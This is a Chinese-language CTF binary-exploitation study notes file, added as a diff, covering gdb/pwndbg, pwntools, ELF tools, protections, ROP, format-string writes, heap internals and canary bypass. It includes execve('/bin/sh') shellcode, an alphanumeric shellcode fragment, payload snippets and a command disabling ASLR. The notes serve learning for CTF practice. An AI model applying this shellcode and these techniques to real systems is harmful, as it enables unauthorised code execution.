@@ -1,0 +1,519 @@
+pwn的所有思想有泄露，爆破，劫持，绕过,覆盖,转移
+nc 192.168.0.x 8080  链接到远程服务器的固定端口
+如何在内存中搜索字符串 pwndbg$ find 0x7ffff79e2000,0x7ffff7bc9000 "print"
+                       pwndbg$ search "print"
+
+
+vim
+vim命令行模式下 %!xxd 可以查看文件的硬编码 %!xxd -r 可以还原成为文件代码
+硬编码是十六进制的
+vimdiff <(readelf ./test) <(readelf ./test1) 可以查看不同文件进行比较
+$vim shellcode 打开题目程序 ：%s/alarm/isnan/g  这样就可以关掉程序的alarm(替换alarm为isnan);也可以$sed -i s/alarm/isnan/g ./shellcode 命令行关掉alarm
+
+
+
+汇编指令
+idiv 带符号除法指令
+imul 带符号乘法指令
+sal 算术左移，保留符号
+sar 算术右移，保留符号
+movsx 带符号拓展传送指令
+jl 小于则跳转，有符号
+jg 大于则跳转，有符号
+jb 小于则跳转，无符号
+ja 大于则跳转，无符号
+div 除法指令，无符号
+mul 乘法指令，无符号
+shl 逻辑左移，无符号
+shr 逻辑右移，无符号
+movzx 无符号拓展传送指令
+
+
+LD_SHOW_AUXV
+LD_SHOW_AUXV=1 ./shellcode  显示一些AT_开头的信息,包括libc的基地址，以及canary的地址(AT_RANDOM)
+
+patchelf
+patchelf --set-interpreter ~/lib/2.23-0ubuntu3_i386/ld-2.23.so ./ret2libc3
+patchelf --replace-needed libc.so.6 ~/lib/2.23-0ubuntu3_i386/libc-2.23.so ./ret2libc3
+
+
+qira
+github.com/qira
+qira -S ./shellcode 类似于gdb的一个软件，可以nice的查看asm以及数据信息
+
+
+
+gcc
+gcc -E test.c
+gcc -S test.c  把c语言代码编译成为汇编代码
+gcc -c test.c
+gcc -fPIE test.c  强行打开pie
+gcc hook.c -o hook.so -shared -fPIC -m32 编译hook的动态库，  LD_PRELOAD=./hook.so ./shellcode 这样就可以hook程序
+
+
+
+objdump
+objdump -d elfDemo.o 查看汇编代码
+objdump -T test | grep system  查看test里面有关system的表项
+objdump -x -s -d elfDemo.rel 查看节的信息
+objdump -r main.o 查看重定位表的信息
+
+
+
+readelf
+readelf -a elfDemo.o 查看elf的所有信息
+readelf -a ./test | grep STACK  查看栈的信息
+readelf -a /libc32/libc-2.32.so | grep system  查看动态库的system地址
+readelf -S elfDemo.rel 查看节头表的详细信息
+readelf -h elfDemo.rel 查看文件头
+文件视角：readelf -x .strtab elf.rel 查看字符串表
+          readelf -x .shstrtab elf.rel 查看节名的字符串表
+          readelf -s elf.rel    查看表.symtab表
+          readelf -r elf.rel    查看重定位表
+内存视角：readelf -l elf.exec   查看程序头
+
+
+ar          用于对静态链接库所包含的目标文件的压缩和处理.
+ar -t libc.a    查看libc.a的所有打包的函数文件
+
+
+动态链接库：
+$gcc -shared -fpic func.c -o func.so    编译动态链接库，-fpic生成与位置无关的代码
+$gcc -fno-stack-protector -o func.Elf main.c ./func.so 用动态链接库func.so编译程序,-fno-stack-protector是栈保护
+
+
+
+linux
+cat /proc/`pidof name`/maps
+
+ncat 
+ncat -vc ./shellcode -kl 127.0.0.1 8888
+ncat -vc 'strace -e trace=read,write ./shellcode' -kl ::1 4000
+
+
+strace 
+strace ./test  查看程序调用函数的流程
+
+
+ltrace
+ltrace  ./test
+
+
+nasm
+编写shellcode：下面的shellcode会有一些问题，通常shellcode会避开0x00(受环境影响如：strcpy),所以一般把mv ecx,0换成xor ecx,ecx
+[section .data]
+global _start
+_start:
+    jmp sh
+se:
+    pop ebx
+    xor eax,eax
+    mov al,11
+    mov ecx,0
+    mov edx,0
+    int 0x80
+sh:
+    call se
+    db '/bin/sh',0
+编译shellcode：
+1.nasm -felf32 sh.asm -o sh.o
+2.ld -o sh sh.o -melf_i386
+3./sh
+把shellcode抠出来
+1.objcopy -O binary sh.o sh.bin
+2.xxd sh.o  把shellcode复制出来
+3.pwntools里引用shellcode的话，sh = open('sh.bin').read()
+#注意：如果能够用的地址不够用，可用构造一个read函数，eax=3,ebx=0,ecx=buffer;当构造shellcode时，越简单越好,能够先读上来就先读上来.
+
+
+
+alhapshellcde:只使用A-za-z0-9写shellcode
+写read的shellcode
+('LLLLY'+   #ecx = buffer
+'jAX4AH'+   #eax = -1
+'0A0'       #make cd(int) = 0xff ^ '2'
+'jAX4AH'+   #eax = -1
+'49'+       #eax ^= '9'
+'0A1'+       #make 0x80 = 0xff ^ '9' ^ 'F'
+'jAX4A'+     #eax = 0
+'PQPPPPPPa'+ #ebx = 0
+'jzZ'+       #edx = 'z'
+'j7X44'      #eax = 3
+).ljust(48,'P')+'2F'
+read(0,buff,xx)
+io.send('A'*x+p32(0x8004axx+x)+sh)
+io.send('\x90'*90+asm(shellcraft.sh()))
+
+
+
+gdbserver
+gdbserver 127.0.0.1:4444 ./binary
+gdb$ target remote 127.0.0.1:4444 
+gdb$ continue
+搭配ncat使用  ncat -vc 'gdbserver 127.0.0.1:4444 ./binary' -kl 127.0.0.1 8888;nc localhost 8888;$gdb target remote ：4444
+
+
+
+
+python
+#!/bin/python3 即可以变成可执行文件
+
+
+
+pwntools
+from pwn import *
+攻击64位的机器时，一定要加上 context.arch = "amd64"
+context.log_level = "debug"  打开调试模式，会显示很多发送和接收的数据都以一个一个字节的形式显示出来
+io = process("./fasdf") 打开一个本地的程序
+io = remote("127.0.01",10088) 打开一个远程的程序
+io.recvline()   接收一行的数据
+io.recv()   接收多行的数据  一般是ascii码编码的字符串
+io.send(b"afasdsfsf")   发送一段字节流数据 send里面的数据必须是字节流，不能是对象
+io.send(p64(1))     发送一个64位的字节流数据  send必须是字节数据切记
+python里的字符串是str对象，并不是字节流 所以send的时候需要 b“” 包裹一下 亦可以是不可见字符 b"\x0a" (换行符)
+io.sendline(b"fasfdas")     sendline发送的数据会在最后面自动添加一个结束符（换行符|结束符） 等效于send(b"fasfdas\n")
+io.interactive()    发送payload后攻击成功后进行交互
+shellcraft.sh() 输出一个sh的shellcode 汇编代码 默认是32位的shellcode
+asm(shellcraft.sh()) 输出一段sh的shellcode的机器码
+shellcraft.amd64.sh() 输出一个sh的shellcode 汇编代码 amd64位的shellcode  记得加上64位环境说明 context.arch
+payload = asm(shellcraft.sh()).ljust(112,b'A')+p32(buf_addr)   ljust是左对齐，shellcode后面用A来填充垃圾数据，一共形成112个字节的字节流
+elf = ELF("./ret2syscall")
+hex(next(elf.search(b'/bin/sh'))) 搜索一个字符串并返回其所在地址 python3里字符串前面必须加上b''，不然找的就是str对象,而不是字节数据
+next() 可以传入生成器
+hex(elf.got["puts"])  查看puts函数在got表中表项的地址
+elf.plt['gets']
+elf.got['gets']
+elf.symbols['buf2']
+io.sendline(b"/bin/sh\x00")  最后\x00是截断符，避免环境问题出现读进去换行符
+变量名和函数名本质上都是符号，elf.symbols['puts']
+io.sendlineafter(b' : ',str(elf.got['puts']))  当收到：后，就发送后面的数据
+io.recvuntil(b" : ")    接收远端的数据直到接受到 ： 符号
+flat(b"a"*60,0xdeadbeef,elf.got['puts']) 把传进来的数据包裹成单位子长的数字，整数的话会用p32（）格式化一下
+cyclic(60) 生成60个字节的垃圾数据
+p32()是把数据打包字节流数据，u32（）是把字节流数据解包成整数/字符数据
+pause() 如果想在pwntools中某一位置在pwndbg中调试，可以在pwntools中的这一位置pause(),然后执行到这里的程序就被挂起到了进程，gdb进入，attach pid 就可以在pwndbg中进行调试
+总结：
+io模块
+    send(payload) 发送payload
+    sendline(payload) 发送payload，并进行换行（末尾\n）
+    sendafter(some_string, payload) 接收到 some_string 后, 发送你的 payload
+    sendlineafter(some_string, payload) 接收到 some_string 后, 发送你的 payload（末尾\n）
+    ##如果接受到的是地址，可以使用recv之后，直接进行int强转
+    data = p.recv("10")
+    libc_start_main_addr = int(data,16) - 247
+    ##如果接受到的是地址，但是是反向的\x10\x00\x40，可以使用recv之后，直接进行int强转
+    data = p.recv("10")
+    libc.address = int(data[:6][::-1].encode("hex"), 16) - libc.symbols["read"]
+    libc.address = u64(data[:6].ljust(8,"\x00")) - libc.symbols["read"]
+    #这两种写法都行，其中[::-1]的意思是逆序取字符串，可以使用u64 强制转换
+    
+    p32/p64: 打包一个整数,分别打包为32或64位,主要是发送的时候需要打包
+    u32/u64: 解包一个字符串,得到整数，接收的时候需要解包
+    
+    recv(numb=4096, timeout=default) : 给出接收字节数,timeout指定超时
+    recvuntil(delims, drop=False) : 接收到delims的pattern
+    （以下可以看作until的特例）
+    recvline(keepends=True) : 接收到\n，keepends指定保留\n
+    recvall() : 接收到EOF
+    recvrepeat(timeout=default) : 接收到EOF或timeout
+    interactive() : 与shell交互
+ELF模块
+    >>>e = ELF('/bin/cat')
+    >>> print hex(e.address)  # 文件装载的基地址
+    0x400000
+    >>> print hex(e.symbols['write']) # 函数地址
+    0x401680
+    >>> print hex(e.got['write']) # GOT表的地址
+    0x60b070
+    >>> print hex(e.plt['write']) # PLT的地址
+    0x401680
+数据处理：主要是对整数进行打包，就是转换成二进制的形式，比如转换成地址。p32、p64是打包，u32、u64是解包。
+
+
+
+保护机制
+1.DEP保护也就是nx保护 地址不可执行 主要是栈空间上面的数据没有执行权限 其他空间没有执行权限的地址空间也会被不可执行
+2.aslr 地址随机化  /proc/sys/kernel/randomize_va_space  0表示没有随机化，1表示部分随机化（库:动态链接库等，栈，mmap，vdso），2表示完全随机化(brk分配的堆内存),stack地址和heap的地址以及libc的地址都会被随机化。
+3.pie 页保护 磁盘内存映像到内存的地址随机化 磁盘上的内容被加载到内存时，其所有数据会被地址随机化 主要有text段，data段和bss段;gcc -fPIC -pie gcc默认是关闭的，输入前面的命令就可以开启pie;开启pie的程序在ida中打开时会是很小的地址，其实是偏移，所以开启pie的题需要先泄漏程序的加载基地址
+4.#gcc -fno-stack-protector -z execstack -no-pie -g -o ret2stack.c ret2stack   fnostackprotector关闭了canary保护  
+-z execstack打开栈可执行权限 -z noexecstack关掉可执行权限，nopie关掉pie -g是调试带上调试信息可以看源代码
+5.#gcc -fno-pie -g -m32 -o dynamic dynamic.c  -m32是编译成32位的程序,需要一些库的支持
+6.canary 保护，canary的值在执行期间都会保存在tls段中的tcbhead_t节中，而x86/x64分别有一个寄存器指向这个tls的tcbhead_t节。x86:gs x64:fs,所以程序会用gs/fs来取已用来比较。
+7.gcc中canary的常见参数：
+-fstack-protector 对alloca系列函数和内部缓冲区大于8字节的函数启用保护
+-fstack-protector-strong 增加包含局部数组定义和地址引用的函数的保护
+-fstack-protector-all 对所有函数启用保护
+-fstack-protector-explicit 对包含stack_protect属性的函数启用保护
+-fno-stack-protector 禁用保护
+
+
+pwndbg
+b *0x401030 断在一个地址
+start 和b main；r 差不多
+n 步过，跳到下一个函数
+s 步入，跳到下一个函数
+ni 单步步过
+si 单步步入
+backtrace 查看函数调用栈
+return 一直执行完这个函数，回到main函数
+vmmap 指令，virtual mermory map 虚拟内存的空间分布
+plt 查看plt的内容
+got 查看got的内容
+x 0x401030 x指令显示地址的内容  x/20x显示20个地址
+disass 0x401030 查看地址内的反汇编
+gdb里看到的数据有很大概率是不可靠的 gdb是用一种特殊的映像映射内存的地址，并不一定正确
+fastbin  查看fastbin空间区域
+heap    产看堆空间的内存区域
+p str   打印str的值
+b *$rebase(0x10030)  如果打开pie的话，elf文件都是偏移无法调试，利用这条指令便可以断在偏移为0x10030的位置
+如果想在pwntools中某一位置在pwndbg中调试，可以在pwntools中的这一位置pause(),然后执行到这里的程序就被挂起到了进程，gdb进入，attach pid 就可以在pwndbg中进行调试
+set disable-randomization off 即可以在gdb中关闭aslr
+layout asm 原始gdb的汇编窗口
+i b 查看所有的断点
+finsh 一直执行到函数的ret
+x/(b/w/g)x 0x60b070 x是十六进制显示，b是byte，w是2word，g是8byte
+x/a 0x60b070  查看地址函数名
+x/7i 0x60b070  查看地址后7条指令
+x/s 0x60b070 查看字符串
+attach pid  附加进进程  cat /proc/sys/kernel/yama/ptrace_scope 默认是1，不能附加进程 需要修改成0
+=================
+parseheap 查看堆内存的一个插件
+hexdump 0x60b070 0x100  查看0x100的堆内存空间分布
+heapinfo 查看heap的分布
+x/10gx $data 十六进制显示10个变量data
+p main_arena 打印关于main_arena的相关信息
+p/x $data 或者 p/x 0x60b070打印变量的十六进制信息
+vmmap libc,vmmap stack,shell nm -D /lib/.../libc-2.27.so | grep environ,x/10gx 0x7fff...+0x38be030,x/10s 0x7ff...（这种方式可以从libc开始查找栈的environ的地址从而leak stack地址）
+a = "\x01\x00\x00\x00\x00\x00" ; u64(a.ljust(8,"\x00")) ; hex(u64(a.ljust(8,"\x00")))
+
+
+pwngdb(这个是pwngdb有堆相关的工具)
+libc 打印libc的基地址
+ld 打印ld的基地址
+codebase 打印代码段的基地址
+heap 打印heap的相关信息
+got 打印got表的信息
+findcall 找到一些函数调用
+tls 打印线程本地的存储地址
+findsyscall 找到系统调用
+fmtarg 计算格式化字符串的索引
+force 计算houseofforce中的nb
+heapinfo heap相关的信息
+heapinfoall 打印堆的信息（所有的线程）
+arenainfo 打印arena的相关信息
+chunkinfo 打印堆块的相关信息
+chunkptr 打印堆块的地址
+mergeinfo 打印mergeinfo的相关信息
+printfastbin 打印一些fastbin的信息
+tracemalloc on 跟踪malloc并释放并检测堆的错误
+parseheap 解析堆的布局
+magic 在glibc中打印有用的变量和函数
+fp 显示文件结构
+fpchain 显示文件的链接列表
+orange 测试houseoforange条件的_IO_flush_lockp(glibc<=2.23)
+
+
+
+pwn
+1.ret2shellcode 一般写在bss段 bss段主要是存放全局变量,并且没有被初始化 这时就有很大的利用空间
+2.远程的aslr一定是打开的，做题时就不用考虑alsr关闭时的情况了
+3.ida里打开的文件是磁盘文件，相当于在内存中执行的text段，data段和bss段 这些是能够看到的,而栈啊堆啊什么的ida里无法看到
+4.如果没有开pie，那么ida里打开elf文件的text段，data段和bss段的地址都是固定的，在内存中也是一样的
+5.alsr nx canary 三种保护措施只要有一种打开了，栈就不可以写shelllcode
+6.gets()栈溢出溢出的return_address控制的是父函数的执行流程 并不是字函数的攻击流程
+7.sudo su;echo 0 > /proc/sys/kernel/randomize_va_space  命令，关掉了aslr，gcc编译时也会减弱自己的防护措施
+8.shell里有一个命令 ldd test  它可以查看所有可执行文件所需要的动态链接库的信息
+9.x86的系统调用是int 0x80  amd64的系统调用是syscall
+10.x86下eax存储系统调用号，int 0x80进行调用  
+11.gdb中的aslr默认是关闭的，即使宿主机的aslr是打开的 gdb是在中间层的虚拟环境 其地址的偏移是绝对没有错误的
+12.动态链接的程序，_start和_init 是汇编实现的是没有栈针的,__libc_start_main 是动态链接库的函数也是没有栈帧的
+13.打pwn时，本地调试只能起到看偏移量的作用， 而不能起到看真实地址的作用
+14.libc的地址一般要再泄漏一次
+15.$strings ret2libc3 | grep sh  linux自带的工具可以查找文件中是否有sh字符串
+16.程序接收到的数据永远是字符串，‘12\n’ 传递过程其实是‘0x31320a’
+17.变量名和函数名本质上都是符号，elf.symbols['puts']
+18.coredump将程序崩溃时的寄存器和内存等信息进行保存，可以保存到指定文件,ulimit -c查看是否开启coredump。后续进行设置(ctf.pwn手册)
+19.LD_PRELOAD=~/c/libc-2.32.so ldd ~/d/test   打pwn时，libc不同时可以实现换库，不过要看一下interpreter是不是符合同一个类型(操作系统不同或者路径不同等) LD_LIBRARY_PATH ??
+20./proc/下的一些文件可能会起到泄漏主机信息的作用，比如cmdline传递内核信息，cpuinfo记录cpu信息，crpyto内核加密算法，device字符设备，interrupts中断列表,kcore系统使用的物理内存。
+21.tele &__malloc_hook 查看malloc hook的地址
+22.通过double_free 来修改malloc_hook为one_gadget，然后调用malloc()时，会自动调用malloc_hook，那么怎么调用malloc_hook函数呢，有俩种方法，一种是通过malloc()来直接调用malloc_hook函数，另一种方式是delete(0),delete(0)，当报错时会自动调用malloc_hook函数
+23.基于libc找malloc_hook函数的地址，libc=ELF("/lib/libc.so.6") libc.symbols["__malloc_hook"]
+
+
+c语言
+printf("%p",&x);  %p用来打印一个地址
+setbuf(stdin,0);  关掉io缓冲区
+setbuf(stdout,0); 关掉io缓冲区 因为有缓冲区的存在,可能缓冲区没有填满,所以io.recv时可以会引起错误
+c语言中传字符串参数时传递其实是字符串的地址（字符串在rodata段） 即system(0x8048720) ==> system("/bin/sh")
+fflush(stdout)  清理缓冲区
+read(0,&buf,0xA)    从标准输入里读取10字节存到了buf变量,0就是标准输入,1标准输出，2是标准错误
+strtol(&buf,v3,v4)    将字符串转换成长整型（long）,并且把结果存放在v4里
+所以输入泄漏时需要str(1345630)  以为程序接收的是字符串，即发送时是把整数的ascii码字符，并不是整数的二进制代码
+fprintf的作用是把输入的信息输出到制定的文件中，stderr和stdout其实差不多
+name = strdup(&s); strdup的作用就是将变量s里面的字符串复制到name里面。于strcpy不同，它是先让你输入根据你输入的长度进行malloc一个堆块，然后把堆块里面的数据复制到name里面去.等同于先malloc(你输入的len)，然后strcpy(name,&s,len);
+(&pool)[i]  这个pool呢，其实是一个指针数组，出题者用pool这个数组来管理堆题里的堆块，比如根据index进行malloc和free
+
+
+
+shellcode
+1.context.arch = "amd64"
+2.context.log_level = "debug"
+
+
+rop
+1.ROPgadget --binary filename --only "pop|ret"  only来筛选后面字符串的片段
+2.ret == pop eip 
+3.gadget一般在text段
+4.execve("/bin/sh",NULL,NULL)   mov eax,0xb;mov ebx,["/bin/sh"];mov ecx,0;mov edx,0;int 0x80
+5.32位和64位的差别，64位前六个参数用寄存器传参，rdi，rsi，rdx，rcx,r8,r9依序压入六个参数
+
+
+
+动态链接和静态链接
+动态链接文件 .so            静态链接文件 .a
+ida打开动态链接文件function里粉色的函数只是一个符号，并没有函数具体实现,符号去解析动态链接库里的函数
+ida打开的静态链接function的函数都有函数体实现,并且函数有父函数的实现
+gcc -fno-pie --static -o statictest test.c  静态链接，并且关掉pie
+gcc -fno-pie -o dytest test.c  动态链接,并且关掉pie
+当一个动态链接文件执行时，会将完整的动态链接库载入到内存中的，所执行函数会在高地址空间可执行段的code，但是并不知道它的真实地址。要执行动态链接库的函数时，会先在低地址空间elf的code段里的plt节(这个节里有一些代码，这些代码用来解析存放libc code段里的所执行函数的真实地址)寻找动态链接库里的真实地址，并填入data段里的got@plt节里，并跳到动态链接库去执行这个函数体
+
+    .dynamic 节提供了动态链接的相关信息，其他的表放在哪里啊
+    link_map 节保存进程载入的动态链接库的链表(另外的链接库,装载器),形成一个链表保存
+    __dl_runtime_resolve 这是一个函数，解析第一次动态链接的程序中执行的函数的真实地址，这个函数是被plt所调用的，会向.got中写入真正的地址的内容
+.got保存了整个程序中的所有的变量偏移量
+.got.plt保存了整个程序中的所有函数的偏移量
+
+plt是保存在代码段里的解析函数真实地址代码的一个节 .got.plt是保存在数据段
+大概流程：用户代码中调用了foo函数，当call foo时，并没有函数的真实地址，就会先call foo@plt，foo@plt是一段汇编代码(在plt表中foo函数的位置)，代码第一行跳到.plt表，表中有所有动态链接所调用的函数，跳到foo@plt第一行汇编代码就会先去找got.plt表找真实地址，因为此次是第一次执行所以没有真实地址，此时会返回到foo@plt的代码,plt接下来的反汇编代码是压入几个参数(分别是foo在.plt中的索引index和哪一个动态链接库)，并跳到__dl_runtime_resolve函数并解析函数的真实地址,并将foo函数在libc中真实地址写入.got.plt表
+
+
+
+ida
+代码段
+    .init 装载函数
+    .plt 每一个表项的长度是16字节
+    .text 
+数据段
+    .got 
+    .got.plt got表项,记录了函数在libc中的真实地址
+0xAu 这个10后面的u是unsigned ,无符号，0-2^32
+n 快捷键重命名变量
+\ 快捷键隐藏/打开变量类型
+r 将整数以char显示
+h 将整数以hex或dec显示
+ctrl+s 查看所有的节的信息
+
+tab 可以从伪代码的函数跳到汇编
+int64 八字节
+
+
+
+
+ret2libc
+一般用俩个函数来构造rop链执行shellcode  read()和system()
+一般system@plt表一定会执行到system的真实地址处   system@plt()==system()
+$string ret2libc1   linux自带的工具可以查找文件中是否有什么字符串
+程序接收总是字符串，所以需要str(1345640)
+ret2csu_init 最后还是返回libc的system
+
+
+binsh
+1.第一种泄漏 string ret2libc | grep "sh"
+2.ida里打开shift+f12
+3.如果给了libc，那就去泄漏libc地址，就可以用libc的binsh字符串
+
+
+
+花式栈溢出
+1.栈迁移        开始 push ebp,mov ebp,esp; 结尾 mov esp,ebp,pop ebp,ret,我们利用栈溢出恶意修改ebp和esp的值，把栈空间迁移到我们可以控制的区域
+
+
+格式化字符串
+printf("",);
+%s 字符串 取得是地址里面的内容 可以泄漏其他段任意地址的内容(可以溢出栈上的地址进行修改进行泄漏plt，got)
+%d 十进制整数
+%p 指针地址 取得是地址  可以泄漏栈上的地址 字符串保存的是字节序列,每一个字符是一个字节，结束是\x00 
+%x 十六进制整数
+%n 把栈上的内容进行解析，和%s差不多，但可以向这个地址写入内容（内容是打印前方成功字符的个数）
+%hn 向目标地址写入2个字节,因为%n一下是写入4个字节
+%hhn 向目标地址写入1个字节
+%nc   n(n代表任意整数，和上面意义不同),可以成功打印n个字符，可以与%n合作使用 %4c0x401680%7$n 就可以向401680地址写入内容
+%n$p  n(n代表任意整数,和上面意义不同)可以是任意值，n$代表取第几个参数,%100$p打印栈上第100个参数
+0x401680%6$s 由于格式化字符串的一个参数就存在在栈上，那么我们就可以在栈上任意地址写入和泄漏任意地址的内容(read@got) 最好不要有0x00,可能会截断
+
+
+
+堆和堆管理器
+1.各种堆管理器:
+    dlmalloc - General purpose allocator
+    ptmalloc2 - glibc
+    jemalloc - FreeBSD and firefox
+    tcmalloc - Google
+    libumem - Solaris
+2.堆(内存)是在堆区，堆管理器是在动态链接库里的一段代码，这段代码用来管理堆区内寸 
+3.堆管理器申请内存的系统调用： brk 和 mmap
+4.堆区低地址紧邻的是data段bss节
+5.主线程都是通过brk从data段扩展而来,也可以用mmap系统调用
+6.虚拟内存的空间通过分页机制分开来的，每一个虚拟内存的页都可以在物理内存中找到实际物理地址
+7.sharelibary 段名其实是 mmap段, mermory map内存映射,mmap段不仅可以存放sharelibary还可以存放堆,物理内存中申请一大段内存map到虚拟内存中
+8.子线程只能用mmap系统调用,主线程申请内存过大的话会直接用mmap，申请的比较小的话紧邻data段扩展一块空间就行了
+9.malloc和free从堆管理器申请和释放内存，__brk 和__mmap是从操作系统要内存的方式
+10.arena内存分配区(从操作系统分配到的内存会用arena管理起来)  chunk用户申请内存的单位,也是堆管理器管理管理内存的基本单位  bin
+11.(操作系统)物理内存 ---> (堆管理器)arena ---> (用户)可用内存    一个进程可以有多个arena，因为一个进程可以有多个线程
+12.malloc thunk      free thunk(1:fastbin freethunk 2:smallbin freethunk 3:unsortedbin freethunk 4;largebin freethunk)
+13.malloc thunk size的低三bit分别是 A(是否是主线程arena的thunk) M(是否是mmap的thunk) P(p为1，代表前一个thunk为malloc 为0代表为前一个thunk为freethunk)
+14.thunk一共有6个控制字段 分别是 prev_size(记录的是前一个freethunk的大小),size(size的末3bit有特殊作用),fd,bk,fd_next,bk_next  
+##malloc 到的字节最小也会有俩个控制字段的大小，32位最小malloc到8字节，64位最小malloc到16字节
+15.当一个thunk是malloc thunk时，只会用前俩个控制字段，当一个mallocthunk前一个thunk也是mallocthunk时，会只用size控制字段(联系14.)
+##前一个mallocthunk不够用时，由于prevsize复用的问题，不管你申请malloc(n8)个字节申请到的都和malloc(n0)是一样的(体现物理链表)
+16.当一个thunk是fastbin freethunk时，会用到前三个控制字段
+17.当一个thunk是smallbin freethunk或者unsortedbin freethunk时，会用到前四个控制字段
+18.当一个thunk是largebin freethunk时，会用到六个控制字段
+19.物理链表(通过prevsize知道上一个thunk的地址，由此链状链接起来所形成的链表)和逻辑链表(通过freethunk的fd，bk，fd_next，bk_next这些指针所链接起来所形成的链表)
+20.fastbin freethunk即使前一个thunk为freethunk，它的size中的previnuse也是1，因为fastbin要足够快，所以不能进行合并
+21.bin管理freethunk用的是链表这个结构
+22.bin呢是一个数组,每个bin大小不同.fastbins中的bin 0x20,0x30,0x40,0x50... ,每一个bin是一个地址，这个地址指向了好多大小相同的freethunk由fd连接成的链表
+23.物理链表是由相邻的thunk的大小size域连接起来的，逻辑链表是由指针连接起来的
+24.除了fastbins和tcahe是单向链表，其他bin都是双向链表
+25.bins的双向链表，是先进先出的结构，malloc的话分配最先的bin,这和fastbin的单向链表(先进后出)不同
+26.紧邻data段的heap区叫做arena分配区，在主线程中arena的控制结构malloc state并不存在于arena中，而是存在于libc的data段,mallocstate(fastbinsY,bins)
+27.free thunk时，if(size<fastbins size)就链入fastbin,if(size>fastbins'size)会暂时放在unsortedbins中，当malloc了一个largebin，会触发unsortedbins合并，遍历unsortedbins并将物理相邻的thunk进行合并，把对应大小的thunk放在smallbins和largebins中，再分配给用户.
+28.largebins里面的thunk是一个范围并不像smallbins中是固定大小的thunk进行链接。
+29.tcache 其实就是super fastbin，tcache和fastbin基本上都一样,libc2.26和libc2.27tcache是没有doublefree检查的
+30.fastbin中早在libc2.19就有了doublefree检查,fastbin有2个检查，第一个是fastbin doublefree检查，第二个是检查是否是这个fastbin的大小
+31.当用户malloc时，arena分配空间并不是选择用户正好大小的thunk，而是一种算法（第一契合算法）进行分配，一般大于用户mallocsize,先对bins中进行遍历，如果有满足大小的thunk会直接分配给用户，如果不够，而且分配的内容不大，会对heap(data紧邻)区进行扩展，如果大小很大，就会调用mmap把物理内存进行映射，映射到虚拟空间
+32.malloc时分配内存顺序:fastbins>unsortedbins-->unsortedbins合并和分类>smallbins>largebins>heap区扩展>mmap内存映射
+
+
+
+绕过的总结
+1.知道libc的地址，不知道栈的地址(aslr)，那我们就可以通过environ来泄漏栈的地址
+2.绕过canary：攻击canary程序的思路是避免程序崩溃。有俩种：
+第一种是将canay的值泄露出来，然后栈溢出覆盖。
+    例如爆破canary，这种情况发生在进程fork时子进程和父进程canary相同，爆破子进程不会影响到父进程。
+    还有一种ssp leak：argv[0]是指向第一个启动参数字符串的指针，只要我们能够输入足够长的字符串覆盖掉argv[0]，我们就能让canary保护输出我们想要地址上的值。普通方法：计算偏移量，目标覆盖掉argv[0]:
+    第三种方法：劫持stack_chk_fail函数，控制程序流程，也就是说刚开始未栈溢出时，我们先改写stack_chk_fail的got表指针内容为我们的后门函数地址，之后我们故意制造栈溢出调用stack_chk_fail时，实际就是执行我们的后门函数
+    第四种方法：canary有一个特征 其内存第一个字节一定是00；一般是随机数00 e1 70 06（32位）,那我们可以用垃圾数据写入到canary的第一个00字节，然后以字符串的形式打印$var变量，这样就会把canary的后三位泄漏出来
+第二种是同时篡改TlS和栈上的canary的值。
+
+
+
+shellcode编写总结：
+1.shellcode的编写大多可采用xor指令进行赋值，ebx一般用popa进行赋值,dec,inc进行加减,最好不要出现\x00.会发生字符截断.
+2.一般字节数不够用时，可以构造read进行读取，eax=3,ebx=0,ecx=buffer,edx=n(读取字节数),int 0x80.一般越难赋值的寄存器越先赋值，比如ebx，
+3.nop滑梯一般很好用
+4.gdb调试时，发送完shellcode，disass一般不会刷新，所以要在disass一下.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
